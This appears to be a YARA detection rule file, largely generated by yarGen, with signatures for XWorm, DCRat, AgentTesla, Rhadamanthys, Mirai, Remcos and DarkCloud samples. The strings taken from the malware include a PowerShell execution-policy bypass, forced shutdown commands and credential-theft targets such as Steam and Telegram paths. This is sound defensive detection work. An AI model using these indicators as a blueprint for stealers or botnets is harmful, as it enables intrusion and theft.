rule XWorm_hybrid_cautious_f34d5f2d4577ed6d9ceec516c1f5a744_f082791d
{
  meta:
    description = "Hybrid: XWorm sample f082791d — file path (PE+size+core) OR memory path (defined(pe)+core) OR imphash-assisted"
    imphash = "f34d5f2d4577ed6d9ceec516c1f5a744"
    sample_sha256 = "f082791d3a71054e2becd94d68323ff2cbe2e597d94fc6135a3a8b524a179e4e"
    vantage = "on_disk|memory"

  strings:
    // core
    $core1 = "-ExecutionPolicy Bypass -File \"" ascii wide fullword
    $core2 = "OfflineKeylogger Not Enabled" ascii wide fullword
    $core3 = "CloseMutex" ascii fullword
    $core4 = "_appMutex" ascii fullword
    $core5 = "AES_Encryptor" ascii fullword
    $core6 = "shutdown.exe /f /s /t 0" ascii wide fullword
    $core7 = "shutdown.exe /f /r /t 0" ascii wide fullword

  condition:
    ( uint16(0) == 0x5A4D and filesize < 100KB and 4 of ($core*) )
    or
    ( pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and 2 of ($core*) )
}


rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5e017bdd {
   meta:
      description = "dropzone - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5e017bdd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5e017bddf4b402d8da9f9f0951e27be4f191f8f3707f3a76d2a8a3f33fd9cca7"
   strings:
      $x1 = "H4sIAAAAAAAEADRaxYKr0Jb9l54ywG2Ia7Dgb4S7W+Drm7r9ulIxjmw5W9ai6j//+R8Z2xTm/38+P5pFGM8pSww9yFxNR+9L9/oJM99+PmhP0a7GRq4IMgQ+YZqFayZH" wide /* score: '65.00'*/
      $s2 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s3 = "KernelBase.dll" fullword ascii /* score: '23.00'*/
      $s4 = "Telegram.exe" fullword wide /* score: '22.00'*/
      $s5 = "SpotifyStartupTask.exe" fullword wide /* score: '22.00'*/
      $s6 = "/config/loginusers.vdf" fullword wide /* score: '21.00'*/
      $s7 = "ping -n 10 localhost > nul" fullword wide /* score: '19.00'*/
      $s8 = "[Plugin] Execute: " fullword wide /* score: '18.00'*/
      $s9 = "~Work.log" fullword wide /* score: '16.00'*/
      $s10 = "QjoLZMgDSOmww4+D0AwQqP4iMgisNq5+feKeZlLqE3/gapEYBIildZlrqGjIAhcO0HSrPkP2OXzdJwCT4c8v0NTOrcWyTOaXbmCFp1O/7Hh+OcS3a7as2+6kNDS8l/UO" wide /* score: '16.00'*/
      $s11 = "HKEY_CLASSES_ROOT\\tdesktop.tg\\shell\\open\\command" fullword wide /* score: '16.00'*/
      $s12 = "process_0" fullword ascii /* score: '15.00'*/
      $s13 = "System.Collections.Generic.IEnumerator<ns64.B45>.get_Current" fullword ascii /* score: '15.00'*/
      $s14 = "System.Collections.Generic.ICollection<H37.o75>.get_Count" fullword ascii /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IEnumerable<H37.o75>.GetEnumerator" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 10 of them
}

rule sig_1e78bfe5597be0fd8d4ca975f5d61f98f8bcacec156e7f055fcf33a918171179_1e78bfe5 {
   meta:
      description = "dropzone - file 1e78bfe5597be0fd8d4ca975f5d61f98f8bcacec156e7f055fcf33a918171179_1e78bfe5.xls"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e78bfe5597be0fd8d4ca975f5d61f98f8bcacec156e7f055fcf33a918171179"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s3 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
      $s4 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 600KB and
      all of them
}

rule AgentTesla_signature_ {
   meta:
      description = "dropzone - file AgentTesla(signature).xlsx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3f2db9052f37fc8ed4872c2f36cf487d695d1662b74f61e982120eda93f77f87"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s3 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
      $s4 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 600KB and
      all of them
}

rule Rhadamanthys_signature_ {
   meta:
      description = "dropzone - file Rhadamanthys(signature).msi"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ced5add172a6cb1a1fa1dda918c1189809663ec8694b9c1d92ab3af1e0bea928"
   strings:
      $x1 = "TableTypeComponent_FileT9YQNLs0viZtSt8tNv3XKk4I1kbb4u6j8.yrj|Krelclailcail.yrjLanguageFileNameVersionpython38.dll3.8.5150.101301" ascii /* score: '57.00'*/
      $x2 = "ion, normally appears in sequence table unless private use.The numeric custom action type, consisting of source location, code t" ascii /* score: '43.00'*/
      $x3 = "idateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFoldersCreateFoldersRegisterUserRegisterP" ascii /* score: '32.00'*/
      $s4 = "5E6A}DirectoryDirectory_ParentDefaultDirLocalAppDataFolderVaractorTARGETDIR.SourceDirFeatureFeature_ParentTitleDescriptionDispla" ascii /* score: '26.00'*/
      $s5 = "033SequenceAttributesFileSize3.2.8.0R-Ele.exeu74J7ZUUnnKwoS3lqhzoyp.oma|Ril.omaqT42Br72o14.26.28808.1ovihklqt.dll|VCRUNTIME140.d" ascii /* score: '19.00'*/
      $s6 = "tallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeaturesPublishProductInstallUISequenceVal" ascii /* score: '18.00'*/
      $s7 = "5566-4A39-BF57-801EAF30D481}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdminExecuteSequenceInstallValidateIns" ascii /* score: '18.00'*/
      $s8 = "TableTypeComponent_FileT9YQNLs0viZtSt8tNv3XKk4I1kbb4u6j8.yrj|Krelclailcail.yrjLanguageFileNameVersionpython38.dll3.8.5150.101301" ascii /* score: '18.00'*/
      $s9 = "yLevelJellyfishFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_PropertyValueManufacturerToga" ascii /* score: '17.00'*/
      $s10 = "ActionData.Number that determines the sort order in which the actions are to be executed. Leave blank to suppress action.Primary" ascii /* score: '17.00'*/
      $s11 = "ature table.Foreign key into Component table.Name of property, uppercase if settable by launcher or loader.String value for prop" ascii /* score: '17.00'*/
      $s12 = "the default setting obtained from the Directory table.Remote execution option, one of irsEnumA conditional statement that will d" ascii /* score: '15.00'*/
      $s13 = "er that determines the sort order in which the actions are to be executed.  Leave blank to suppress action.Optional expression w" ascii /* score: '14.00'*/
      $s14 = "lowedFor foreign key, Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition" ascii /* score: '14.00'*/
      $s15 = "ify a particular component record.GuidA string GUID unique to this component, version, and language.Required key of a Directory " ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__113e75da {
   meta:
      description = "dropzone - file Rhadamanthys(signature)_113e75da.msi"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "113e75da8b0dbb462910fddadb5b53ab322a12d0cd8d0029c36dd25efdc8e589"
   strings:
      $x1 = "TableTypeComponent_FileT9YQNLs0viZtSt8tNv3XKk4I1kbb4u6j8.yrj|Krelclailcail.yrjLanguageFileNameVersionpython38.dll3.8.5150.101301" ascii /* score: '57.00'*/
      $x2 = "action, normally appears in sequence table unless private use.The numeric custom action type, consisting of source location, cod" ascii /* score: '43.00'*/
      $x3 = "ValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFoldersCreateFoldersRegisterUserRegist" ascii /* score: '32.00'*/
      $s4 = "9A2B}DirectoryDirectory_ParentDefaultDirLocalAppDataFolderForefeelTARGETDIR.SourceDirFeatureFeature_ParentTitleDescriptionDispla" ascii /* score: '26.00'*/
      $s5 = "033SequenceAttributesFileSize3.2.8.0R-Ele.exeu74J7ZUUnnKwoS3lqhzoyp.oma|Ril.omaqT42Br72o14.26.28808.1ovihklqt.dll|VCRUNTIME140.d" ascii /* score: '19.00'*/
      $s6 = "TableTypeComponent_FileT9YQNLs0viZtSt8tNv3XKk4I1kbb4u6j8.yrj|Krelclailcail.yrjLanguageFileNameVersionpython38.dll3.8.5150.101301" ascii /* score: '18.00'*/
      $s7 = "4E-A125-470E-9153-E761D9103710}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdminExecuteSequenceInstallValidate" ascii /* score: '18.00'*/
      $s8 = "InstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeaturesPublishProductInstallUISequence" ascii /* score: '18.00'*/
      $s9 = " Feature table.Foreign key into Component table.Name of property, uppercase if settable by launcher or loader.String value for p" ascii /* score: '17.00'*/
      $s10 = "BadActionData.Number that determines the sort order in which the actions are to be executed. Leave blank to suppress action.Prim" ascii /* score: '17.00'*/
      $s11 = "th the default setting obtained from the Directory table.Remote execution option, one of irsEnumA conditional statement that wil" ascii /* score: '15.00'*/
      $s12 = "umber that determines the sort order in which the actions are to be executed.  Leave blank to suppress action.Optional expressio" ascii /* score: '14.00'*/
      $s13 = " allowedFor foreign key, Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condit" ascii /* score: '14.00'*/
      $s14 = "ing a visible feature item.Longer descriptive text describing a visible feature item.Numeric sort order, used to force a specifi" ascii /* score: '13.00'*/
      $s15 = "yLevelNiccoliteFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_PropertyValueManufacturerCapi" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 14000KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__1a70e911 {
   meta:
      description = "dropzone - file Mirai(signature)_1a70e911.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1a70e911a5fa67eda43307589b55d6f46066b274565334e5e3ac932635f05791"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s4 = "hexdump" fullword ascii /* score: '18.00'*/
      $s5 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s7 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s8 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "rsyslog" fullword ascii /* score: '13.00'*/
      $s15 = "syslogd" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__1fd431bc {
   meta:
      description = "dropzone - file Mirai(signature)_1fd431bc.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1fd431bc596370daa1e383f8ee38a1c6743793429ee6e11e08a584763e4db2f6"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s4 = "hexdump" fullword ascii /* score: '18.00'*/
      $s5 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s7 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s8 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "rsyslog" fullword ascii /* score: '13.00'*/
      $s15 = "syslogd" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__3f0366c3 {
   meta:
      description = "dropzone - file Mirai(signature)_3f0366c3.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3f0366c3eb2026f0237e1caeed26bf6e6a89327aa48013f23d9875ca539fb2b2"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s2 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s3 = "__pthread_mutex_lock_full" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s5 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s6 = "pthread_mutex_lock.c" fullword ascii /* score: '18.00'*/
      $s7 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_mutex_unlock.c" fullword ascii /* score: '18.00'*/
      $s9 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s10 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s11 = "update_process" fullword ascii /* score: '15.00'*/
      $s12 = "gethostname.c" fullword ascii /* score: '14.00'*/
      $s13 = "read_encoded_value_with_base" fullword ascii /* score: '12.00'*/
      $s14 = "pthread_getspecific.c" fullword ascii /* score: '12.00'*/
      $s15 = "read_encoded_value" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__6266d46e {
   meta:
      description = "dropzone - file Mirai(signature)_6266d46e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6266d46e4f3ee5d24b72fd02f452b18a8bddc495682fd1bb2d274e5818487bff"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s4 = "hexdump" fullword ascii /* score: '18.00'*/
      $s5 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s7 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s8 = "kill_process_tree" fullword ascii /* score: '15.00'*/
      $s9 = "is_attack_process" fullword ascii /* score: '15.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__9e52bc86 {
   meta:
      description = "dropzone - file Mirai(signature)_9e52bc86.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9e52bc8628fd0dfba89926380720c58310285953d4dd40aac743a28d757e7ab2"
   strings:
      $s1 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s2 = ".systemd-jd" fullword ascii /* score: '11.00'*/
      $s3 = "dropbear" fullword ascii /* score: '10.00'*/
      $s4 = "cundi.ppc" fullword ascii /* score: '10.00'*/
      $s5 = "cundi.arm" fullword ascii /* score: '10.00'*/
      $s6 = "kill2 %s:%d" fullword ascii /* score: '9.50'*/
      $s7 = "N^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii /* score: '9.00'*/
      $s8 = "telnetd" fullword ascii /* score: '8.00'*/
      $s9 = "killall" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__b7000208 {
   meta:
      description = "dropzone - file Mirai(signature)_b7000208.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b7000208ef11005c29728cdb5d23bec21d69186e05e4ccc1869a1c11fd237eba"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s4 = "hexdump" fullword ascii /* score: '18.00'*/
      $s5 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s7 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s8 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "rsyslog" fullword ascii /* score: '13.00'*/
      $s15 = "syslogd" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "971c47e1602e19ed5c2d65992bbd8ed9d8480e60849c355dd2e6909ae83dcfba"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\ERjPfwwFdH\\src\\obj\\Debug\\xzIN.pdb" fullword ascii /* score: '40.00'*/
      $x2 = "C:\\Users\\asus\\source\\repos\\CafeOtomasyon\\CafeOtomasyon\\bin\\Debug\\Settings.txt" fullword wide /* score: '32.00'*/
      $s3 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '28.00'*/
      $s4 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, Pub" ascii /* score: '28.00'*/
      $s5 = "System.Windows.Forms.FormStartPosition, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089h" ascii /* score: '27.00'*/
      $s6 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADa" fullword ascii /* score: '27.00'*/
      $s7 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Font, System.Drawing, Version=4." ascii /* score: '27.00'*/
      $s8 = "System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, S" ascii /* score: '27.00'*/
      $s9 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aySystem.Windows.Forms.Im" ascii /* score: '27.00'*/
      $s10 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aySystem.Windows.Forms.Im" ascii /* score: '27.00'*/
      $s11 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s12 = "System.Windows.Forms.FormStartPosition, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089h" ascii /* score: '27.00'*/
      $s13 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '25.00'*/
      $s14 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADP" fullword ascii /* score: '24.00'*/
      $s15 = "rawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3auSystem.Windows.Forms.Padding, System.Windows.Forms, Ve" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 6 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "091e27447a439cf6edb67f7d30b25531563d6dcc43348502de7e4a0925a52fdc"
   strings:
      $s1 = "Welusenloj.exe" fullword wide /* score: '22.00'*/
      $s2 = "Cyiuxpd.Processing" fullword ascii /* score: '18.00'*/
      $s3 = "ExecuteTransferableTask" fullword ascii /* score: '18.00'*/
      $s4 = "ExecuteExternalTask" fullword ascii /* score: '18.00'*/
      $s5 = "ExecuteReadableTask" fullword ascii /* score: '18.00'*/
      $s6 = "ExecuteActiveTask" fullword ascii /* score: '18.00'*/
      $s7 = "connectionEncryptor" fullword ascii /* score: '17.00'*/
      $s8 = "HWelusenloj, Version=1.0.8307.17530, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s9 = "m_AdjustableExecutorTxt" fullword ascii /* score: '16.00'*/
      $s10 = "decryptor" fullword wide /* score: '15.00'*/
      $s11 = "isSystemPredictor" fullword ascii /* score: '14.00'*/
      $s12 = "EncryptOrder" fullword ascii /* score: '14.00'*/
      $s13 = "m_CommandObject" fullword ascii /* score: '12.00'*/
      $s14 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s15 = "Cyiuxpd.Threading" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 90KB and
      8 of them
}

rule Mirai_signature__0465a46a {
   meta:
      description = "dropzone - file Mirai(signature)_0465a46a.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0465a46a9ac27e8d41e3a9d47710b7e6b92ed56c458ee49ebd38cacdac75a571"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
